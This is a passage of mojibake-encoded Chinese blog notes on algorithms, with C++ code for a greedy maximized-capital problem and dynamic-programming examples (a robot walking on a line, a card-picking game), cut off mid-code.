class="hljs-comment">/*é€‰æ‹©èµ„æœ¬éœ€æ±‚å°çš„é¡¹ç›®ï¼šé¦–å…ˆè¦ä¿è¯ä½ æœ‰è¶³å¤Ÿçš„èµ„æœ¬æ¥æŠ•èµ„é¡¹ç›®ã€‚å› æ­¤ï¼Œä¼˜å…ˆè€ƒè™‘å½“å‰èµ„æœ¬ï¼ˆWï¼‰å°äºæˆ–ç­‰äºé¡¹ç›®èµ„æœ¬éœ€æ±‚çš„é¡¹ç›®ã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">é€‰æ‹©åˆ©æ¶¦æœ€å¤§çš„é¡¹ç›®ï¼šåœ¨æ»¡è¶³èµ„æœ¬æ¡ä»¶çš„é¡¹ç›®ä¸­ï¼Œé€‰æ‹©èƒ½å¤Ÿå¸¦æ¥æœ€å¤§åˆ©æ¶¦çš„é¡¹ç›®è¿›è¡ŒæŠ•èµ„ã€‚è¿™æ ·å¯ä»¥ç¡®ä¿æ¯æ¬¡æŠ•èµ„å¸¦æ¥æœ€å¤§çš„èµ„æœ¬å¢é•¿ã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">é‡å¤è¿›è¡Œï¼šé‡å¤ä¸Šè¿°ä¸¤æ­¥ï¼Œç›´åˆ°å®Œæˆæœ€å¤š K æ¬¡æŠ•èµ„ã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">å…·ä½“æµç¨‹ï¼š</span><br><span class="hljs-comment">æˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ªå †ï¼š</span><br><span class="hljs-comment">å°æ ¹å †ï¼šæŒ‰ç…§èµ„æœ¬å¤§å°æ’åºï¼Œä¿è¯æ¯æ¬¡ä»æœ€å°çš„èµ„æœ¬éœ€æ±‚å¼€å§‹è€ƒè™‘é¡¹ç›®ã€‚</span><br><span class="hljs-comment">å¤§æ ¹å †ï¼šæŒ‰ç…§åˆ©æ¶¦å¤§å°æ’åºï¼Œç¡®ä¿æ¯æ¬¡ä»åˆ©æ¶¦æœ€å¤§çš„é¡¹ç›®ä¸­é€‰æ‹©ã€‚</span><br><span class="hljs-comment">è´ªå¿ƒé€‰æ‹©ç†ç”±ï¼š</span><br><span class="hljs-comment">ä¸ºä»€ä¹ˆé€‰æ‹©èµ„æœ¬éœ€æ±‚å°çš„é¡¹ç›®ï¼Ÿ</span><br><span class="hljs-comment">å› ä¸ºæˆ‘ä»¬éœ€è¦ä¿è¯æ¯æ¬¡æŠ•èµ„éƒ½èƒ½é¡ºåˆ©è¿›è¡Œã€‚æˆ‘ä»¬ä¸èƒ½è·³è¿‡å½“å‰èµ„é‡‘æ— æ³•æŠ•èµ„çš„é¡¹ç›®ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªä¼˜å…ˆé˜Ÿåˆ—æ¥é€æ­¥ç­›é€‰ç¬¦åˆæ¡ä»¶çš„é¡¹ç›®ã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">ä¸ºä»€ä¹ˆé€‰æ‹©åˆ©æ¶¦å¤§çš„é¡¹ç›®ï¼Ÿ</span><br><span class="hljs-comment">ä¸ºäº†æœ€å¤§åŒ–èµ„æœ¬çš„å¢é•¿ã€‚æ¯æ¬¡é€‰æ‹©èƒ½å¤Ÿå¸¦æ¥æœ€å¤§åˆ©æ¶¦çš„é¡¹ç›®ï¼Œèƒ½å¤Ÿåœ¨æ¥ä¸‹æ¥çš„æŠ•èµ„ä¸­è·å¾—æ›´å¤šçš„èµ„æœ¬ï¼Œä»è€Œå¢åŠ åç»­å¯é€‰çš„é¡¹ç›®èŒƒå›´ã€‚*/</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_N = <span class="hljs-number">100</span>;  <span class="hljs-comment">// å‡è®¾æœ€å¤šæœ‰100ä¸ªé¡¹ç›®</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">findMaximizedCapital</span><span class="hljs-params">(<span class="hljs-type">int</span> K, <span class="hljs-type">int</span> W, <span class="hljs-type">int</span> Profits[], <span class="hljs-type">int</span> Capital[], <span class="hljs-type">int</span> N)</span> &#123;<br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå°æ ¹å †ï¼ˆæ ¹æ®èµ„æœ¬æ’åºï¼‰ï¼ŒminCostQå­˜å‚¨èµ„æœ¬å’Œå¯¹åº”çš„åˆ©æ¶¦</span><br>    <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;, greater&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;&gt; minCostQ;<br>    <br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå¤§æ ¹å †ï¼ˆæ ¹æ®åˆ©æ¶¦æ’åºï¼‰ï¼ŒmaxProfitQå­˜å‚¨åˆ©æ¶¦å’Œå¯¹åº”çš„èµ„æœ¬</span><br>    <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; maxProfitQ;<br><br>    <span class="hljs-comment">// å°†æ‰€æœ‰é¡¹ç›®æŒ‰ç…§èµ„æœ¬å¤§å°åŠ å…¥minCostQ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        minCostQ.push(&#123;Capital[i], Profits[i]&#125;);<br>    &#125;<br><br>    <span class="hljs-comment">// åšKæ¬¡æŠ•èµ„ï¼Œæ¯æ¬¡é€‰æ‹©åˆ©æ¶¦æœ€å¤§åŒ–</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; K; i++) &#123;<br>        <span class="hljs-comment">// å°†æ‰€æœ‰èµ„æœ¬ä¸è¶…è¿‡å½“å‰Wçš„é¡¹ç›®åŠ å…¥åˆ°maxProfitQ</span><br>        <span class="hljs-keyword">while</span> (!minCostQ.empty() &amp;&amp; minCostQ.top().first &lt;= W) &#123;<br>            maxProfitQ.push(minCostQ.top());<br>            minCostQ.pop(); <span class="hljs-comment">// ä»minCostQä¸­ç§»é™¤å·²é€‰æ‹©çš„é¡¹ç›®</span><br>        &#125;<br><br>        <span class="hljs-comment">// å¦‚æœmaxProfitQä¸ºç©ºï¼Œè¡¨ç¤ºæ²¡æœ‰å¯ä»¥æŠ•èµ„çš„é¡¹ç›®ï¼Œè¿”å›å½“å‰èµ„æœ¬</span><br>        <span class="hljs-keyword">if</span> (maxProfitQ.empty()) &#123;<br>            <span class="hljs-keyword">return</span> W;<br>        &#125;<br><br>        <span class="hljs-comment">// ä»maxProfitQä¸­å–å‡ºåˆ©æ¶¦æœ€å¤§çš„é¡¹ç›®ï¼Œæ›´æ–°å½“å‰èµ„æœ¬W</span><br>        W += maxProfitQ.top().second;<br>        maxProfitQ.pop(); <span class="hljs-comment">// ç§»é™¤å·²é€‰æ‹©çš„é¡¹ç›®</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> W; <span class="hljs-comment">// è¿”å›ç»è¿‡Kæ¬¡æŠ•èµ„åçš„æœ€å¤§èµ„æœ¬</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> Profits[MAX_N] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;     <span class="hljs-comment">// æ¯ä¸ªé¡¹ç›®çš„åˆ©æ¶¦</span><br>    <span class="hljs-type">int</span> Capital[MAX_N] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;;     <span class="hljs-comment">// æ¯ä¸ªé¡¹ç›®æ‰€éœ€çš„èµ„æœ¬</span><br>    <span class="hljs-type">int</span> K = <span class="hljs-number">2</span>;                          <span class="hljs-comment">// æœ€å¤šå¯ä»¥è¿›è¡Œ2æ¬¡æŠ•èµ„</span><br>    <span class="hljs-type">int</span> W = <span class="hljs-number">0</span>;                          <span class="hljs-comment">// åˆå§‹èµ„æœ¬ä¸º0</span><br>    <span class="hljs-type">int</span> N = <span class="hljs-number">3</span>;                          <span class="hljs-comment">// é¡¹ç›®æ•°é‡</span><br><br>    <span class="hljs-comment">// è°ƒç”¨å‡½æ•°è·å–ç»è¿‡Kæ¬¡æŠ•èµ„åçš„æœ€å¤§èµ„æœ¬</span><br>    <span class="hljs-type">int</span> result = findMaximizedCapital(K, W, Profits, Capital, N);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Maximized Capital: &quot;</span> &lt;&lt; result &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-comment">// è¾“å‡ºæœ€å¤§èµ„æœ¬</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="åä¹-åŠ¨æ€è§„åˆ’"><a href="#åä¹-åŠ¨æ€è§„åˆ’" class="headerlink" title="åä¹.åŠ¨æ€è§„åˆ’"></a>åä¹.åŠ¨æ€è§„åˆ’</h2><h3 id="ä»æš´åŠ›é€’å½’åˆ°åŠ¨æ€è§„åˆ’"><a href="#ä»æš´åŠ›é€’å½’åˆ°åŠ¨æ€è§„åˆ’" class="headerlink" title="ä»æš´åŠ›é€’å½’åˆ°åŠ¨æ€è§„åˆ’"></a>ä»æš´åŠ›é€’å½’åˆ°åŠ¨æ€è§„åˆ’</h3><p>1ï¼Œå°è¯•è¿ç”¨æ¨¡å‹è§£å‡ºæš´åŠ›é€’å½’ï¼ŒåŸåˆ™æ˜¯å°½é‡å°‘å‚ï¼Œå¯å˜å‚æ•°é™åˆ¶åœ¨int<br>    ä»å·¦å¾€å³çš„å°è¯•æ¨¡å‹ï¼šè¦ or ä¸è¦<br>    èŒƒå›´å°è¯•æ¨¡å‹ï¼š0-indexä¸­çš„å¯èƒ½æ€§<br>    æ ·æœ¬å¯¹åº”æ¨¡å‹ï¼š0-i å’Œ 0-j ä¸­åˆ¤æ–­é€»è¾‘ï¼Œæˆ‘ä»¬ä¸€èˆ¬è®¨è®ºiæˆä¸ºå’Œä¸æˆä¸ºç­”æ¡ˆä¸jæˆä¸ºå’Œä¸æˆä¸ºç­”æ¡ˆ<br>    ä¸šåŠ¡é€»è¾‘é™åˆ¶æ¨¡å‹ï¼š</p><p>â€‹æš´åŠ›å°è¯•æ¨¡å‹è¦è®°å¾—æŠŠè¾¹ç•Œæ¡ä»¶å®šä¹‰å‡ºæ¥ï¼Œæœ€åå®Œæˆæš´åŠ›æ¨¡å‹ä¸€å®šè¦æ³¨æ„è®¾ç½®çš„å‚æ•°ä¸è¦æœ‰è´Ÿæ•°ï¼Œè¦åœ¨è¿›å…¥å­è¿‡ç¨‹å‰ç”¨ifè¿‡æ»¤æ‰å°±ä¸ç”¨å†™å‰é¢äº†ï¼Œåœ¨å­è¿‡ç¨‹å‰å†™</p><p>2ï¼Œå†™å‡ºé€’å½’å°è¯•åä½¿ç”¨dp<br>    å‘ç°é‡å¤è°ƒç”¨äº†å­è¿‡ç¨‹ç”¨dpå‚»ç¼“å­˜ï¼Œä¸»å‡½æ•°è®¾éƒ½æ˜¯-1çš„è¡¨ï¼Œè¿‡ç¨‹åŠ ä¸Šè¿™ä¸ªdp,ç›´æ¥æŠŠæš´åŠ›é€’å½’æŠ„ä¸‹æ¥ï¼Œç¬¬ä¸€è¡Œå†™ if (dp<code>[i][j]</code> !&#x3D; -1) {return dp<code>[i][j]</code>}æœ€åä¸€è¡Œdp<code>[i][j]</code>&#x3D;..<br>    ç”»å‡ºè¡¨æ ¼å‘ç°æŸäº›å„ç§ç”¨foræ¥è®¡ç®—å…¶ä»–æ ¼å­ï¼Œæ‰¾å‡ºä½ç½®ä¾èµ–è‡ªå·±å°è¯•å¡«å……æ ¼å­</p><p>3ï¼Œåˆ†æä¾èµ–å…³ç³»è‡ªå·±ä¼˜åŒ–å¡«è¡¨<br>    æŸä¸ªæ ¼å­ä¾èµ–ä¸‹é¢å’Œå·¦é¢ï¼Œé‚£å°±å¾€ä¸Šé¢å’Œå³é¢å¡«è¡¨<br>    è·¯å¾„å‹ç¼©ï¼šå°±æ˜¯ä¸€ä¸ªä¹‹å‰ç®—å®Œçš„æ ¼å­å¯ä»¥æ›¿ä»£ç°åœ¨è¦ç®—çš„å¾ˆå¤šæ ¼å­<br>    æ–œç‡ä¼˜åŒ–ï¼š</p><h3 id="ä¾‹é¢˜-10"><a href="#ä¾‹é¢˜-10" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="å®‡å®™æœºå™¨äºº"><a href="#å®‡å®™æœºå™¨äºº" class="headerlink" title="å®‡å®™æœºå™¨äºº"></a>å®‡å®™æœºå™¨äºº</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//æœºå™¨äººå¯ä»¥æ¯æ­¥å‘å·¦å’Œå³èµ°ä¸€æ ¼ï¼Œé‚£ä¹ˆèµ°kæ­¥åˆ°aimçš„æ–¹æ³•æ•°æ˜¯å¤šå°‘</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-comment">//ä¸»è¿‡ç¨‹å…ˆé™¤æ‰ä¸å¯èƒ½çš„å€¼</span><br><span class="hljs-comment">// æœºå™¨äººå½“å‰æ¥åˆ°çš„ä½ç½®æ˜¯curï¼Œ æœºå™¨äººè¿˜æœ‰restæ­¥éœ€è¦å»èµ°ï¼Œæœ€ç»ˆçš„ç›®æ ‡æ˜¯aimï¼Œ æœ‰å“ªäº›ä½ç½®ï¼Ÿ1~N è¿”å›ï¼šæœºå™¨äººä»curå‡ºå‘ï¼Œèµ°è¿‡restæ­¥ä¹‹åï¼Œæœ€ç»ˆåœåœ¨aimçš„æ–¹æ³•æ•°ï¼Œæ˜¯å¤šå°‘ï¼Ÿ</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process1</span><span class="hljs-params">(<span class="hljs-type">int</span> cur, <span class="hljs-type">int</span> rest, <span class="hljs-type">int</span> aim, <span class="hljs-type">int</span> N)</span> &#123;<br>    <span class="hljs-keyword">if</span> (rest == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> cur == aim ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">1</span>) &#123;   <span class="hljs-comment">//åªèƒ½å‘å³</span><br>        <span class="hljs-keyword">return</span> process1(<span class="hljs-number">2</span>, rest - <span class="hljs-number">1</span>, aim, N);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (cur == N) &#123;    <span class="hljs-comment">//åªèƒ½å‘å·¦</span><br>        <span class="hljs-keyword">return</span> process1(N - <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, aim, N);<br>    &#125;<br>    <span class="hljs-keyword">return</span> process1(cur - <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, aim, N) + process1(cur + <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, aim, N);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">ways1</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> aim, <span class="hljs-type">int</span> K)</span> &#123;<br>    <span class="hljs-keyword">if</span> (N &lt; <span class="hljs-number">2</span> || start &lt; <span class="hljs-number">1</span> || start &gt; N || aim &lt; <span class="hljs-number">1</span> || aim &gt; N || K &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> process1(start, K, aim, N);<br>&#125;<br><br><br><br><br><br><br><span class="hljs-comment">//å‚»ç¼“å­˜æ³•ï¼Œå°±æ˜¯åœ¨ä¸Šé¢çš„é€’å½’è¿‡ç¨‹ä¸­æŠŠå­è¿‡ç¨‹çš„å€¼æŠ„åˆ°è¡¨é‡Œ</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process2</span><span class="hljs-params">(<span class="hljs-type">int</span> cur, <span class="hljs-type">int</span> rest, <span class="hljs-type">int</span> aim, <span class="hljs-type">int</span> N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; dp)</span> &#123;<br>    <span class="hljs-keyword">if</span> (dp[cur][rest] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> dp[cur][rest];<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (rest == <span class="hljs-number">0</span>) &#123;<br>        ans = cur == aim ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">1</span>) &#123;<br>        ans = process2(<span class="hljs-number">2</span>, rest - <span class="hljs-number">1</span>, aim, N, dp);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cur == N) &#123;<br>        ans = process2(N - <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, aim, N, dp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        ans = process2(cur - <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, aim, N, dp) + process2(cur + <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, aim, N, dp);<br>    &#125;<br>    dp[cur][rest] = ans; <span class="hljs-comment">//æŠŠæ¬¡è°ƒç”¨çš„æ•°ç»„å¡«åˆ°è¡¨é‡Œ</span><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">ways2</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> aim, <span class="hljs-type">int</span> K)</span> &#123;<br>    <span class="hljs-keyword">if</span> (N &lt; <span class="hljs-number">2</span> || start &lt; <span class="hljs-number">1</span> || start &gt; N || aim &lt; <span class="hljs-number">1</span> || aim &gt; N || K &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(K + <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>)); <span class="hljs-comment">//0-Nå’Œ0-Kï¼Œè®°å¾—è®¾å®šä¸º-1</span><br>    <span class="hljs-keyword">return</span> process2(start, K, aim, N, dp);<br>&#125;<br><br><br><br><br><span class="hljs-comment">//ç”»è¡¨åˆ†æè¿‡ç¨‹ä¸­çš„ä¾èµ–å…³ç³»è‡ªå·±å¡«è¡¨</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ways3</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> aim, <span class="hljs-type">int</span> K)</span> &#123;<br>    <span class="hljs-keyword">if</span> (N &lt; <span class="hljs-number">2</span> || start &lt; <span class="hljs-number">1</span> || start &gt; N || aim &lt; <span class="hljs-number">1</span> || aim &gt; N || K &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(K + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>    dp[aim][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">1</span>; rest &lt;= K; rest++) &#123;<br>        dp[<span class="hljs-number">1</span>][rest] = dp[<span class="hljs-number">2</span>][rest - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">2</span>; cur &lt; N; cur++) &#123;<br>            dp[cur][rest] = dp[cur - <span class="hljs-number">1</span>][rest - <span class="hljs-number">1</span>] + dp[cur + <span class="hljs-number">1</span>][rest - <span class="hljs-number">1</span>];<br>        &#125;<br>        dp[N][rest] = dp[N - <span class="hljs-number">1</span>][rest - <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[start][K];<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="èªæ˜äººç©æ‰‘å…‹"><a href="#èªæ˜äººç©æ‰‘å…‹" class="headerlink" title="èªæ˜äººç©æ‰‘å…‹"></a>èªæ˜äººç©æ‰‘å…‹</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//ä¸¤ä¸ªèªæ˜äººç©æŠ½ç‰Œï¼Œæ¯æ¬¡åªèƒ½æŠ½æœ€å·¦å’Œæœ€å³çš„ä¸€å¼ ç‰Œï¼Œè¿”å›èƒœè¿™ä¸¤äººä¸­æœ€å¤§çš„åˆ†æ•°</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-comment">//å…ˆæ‰‹è·å¾—çš„æœ€å¥½åˆ†æ•°è¿”å›</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> L, <span class="hljs-type">int</span> R)</span> &#123;<br>    <span class="hljs-keyword">if</span> (L == R) &#123;<br>        <span class="hljs-keyword">return</span> arr[L];<br>    &#125;<br>    <span class="hljs-type">int</span> p1 = arr[L] + g1(arr, L + <span class="hljs-number">1</span>, R);  <span class="hljs-comment">//å†™p1p2ä»£è¡¨å¯èƒ½æ€§</span><br>    <span class="hljs-type">int</span> p2 = arr[R] + g1(arr, L, R - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> max(p1, p2);<br>&#125;<br><span class="hljs-comment">//åæ‰‹è·å¾—çš„æœ€å¥½åˆ†æ•°è¿”å›</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">g1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> L, <span class="hljs-type">int</span> R)</span> &#123;<br>    <span class="hljs-keyword">if</span> (L == R) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> p1 = f1(arr, L + <span class="hljs-number">1</span>, R); <span class="hljs-comment">// å¯¹æ‰‹æ‹¿èµ°äº†Lä½ç½®çš„æ•°</span><br>    <span class="hljs-type">int</span> p2 = f1(arr, L, R - <span class="hljs-number">1</span>); <span class="hljs-comment">// å¯¹æ‰‹æ‹¿èµ°äº†Rä½ç½®çš„æ•°</span><br>    <span class="hljs-keyword">return</span> min(p1, p2);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">win1</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> first = f1(arr, <span class="hljs-number">0</span>, arr.size() - <span class="hljs-number">1</span>);<br>    <span class="hljs-type">int</span> second = g1(arr, <span class="hljs-number">0</span>, arr.size() - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> max(first, second);<br>&#125;<br><br><br><br><br><br><span class="hljs-comment">//å‚»ç¼“å­˜æ³•</span><br><span class="hljs-comment">// 